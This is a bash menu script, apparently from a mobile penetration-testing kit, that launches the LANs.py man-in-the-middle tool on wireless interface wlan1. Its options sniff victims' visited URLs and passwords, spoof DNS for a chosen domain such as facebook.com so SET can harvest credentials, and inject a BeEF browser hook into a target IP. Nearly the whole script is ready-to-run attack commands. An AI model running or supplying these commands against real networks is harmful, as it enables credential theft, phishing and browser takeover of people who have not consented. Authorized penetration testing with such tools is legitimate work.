#!/bin/bash
LANspy="/opt/pwnpad/LANspy/LANs.py"
##################################################################
#                           MENU                                 #
##################################################################
f_interface(){
clear
echo "************************"
toilet -f standard -F metal "LANspy"
echo "************************"
echo "THIS SHOULD BE RUN IN VNC FOR BEST RESULTS"
echo "[1] BASIC - Print URLs victim vists, portscan, and passwords."
echo "[2] AGGRESIVE - Use SET to spoof domain. Lauch drifnet and BASIC. "
echo "[3] BEEF - Run to inject beefhook in victim. Must run BEEF before this."
echo "##########################"
echo "[0] Exit"
echo -n "Enter your menu choice [1-3]: "

# wait for character input

read -p "Choice:" menuchoice

case $menuchoice in

1) f_basic ;;
2) f_aggressive ;;
3) f_beef ;;
0) exit 0 ;;
*) echo "Incorrect choice..." ;
esac
}
##################################################################
#                           BASIC                                #
##################################################################
f_basic(){
    clear
    echo "Running portscan, visited URLs, and passwords"
    python $LANspy -i wlan1 -u -n -p
    f_interface
}
##################################################################
#                         Aggresive                              #
##################################################################
f_aggressive(){
    clear
    read -p "Enter victim IP:" victimip
    read -p "Enter domain to spoof (e.g. facebook.com):" spoofdns
    python $LANspy -i wlan1 -u -p -n -na -dns $spoofdns -set -d -ip $victimip
    f_interface
}
##################################################################
#                         Aggresive                              #
##################################################################
f_beef(){
    clear
    read -p "Enter victim IP:" victimip
    python LANs.py -i wlan1 -b http://localhost:3000/hook.js -ip $victimip
    f_interface
}
##################################################################
##################################################################
f_interface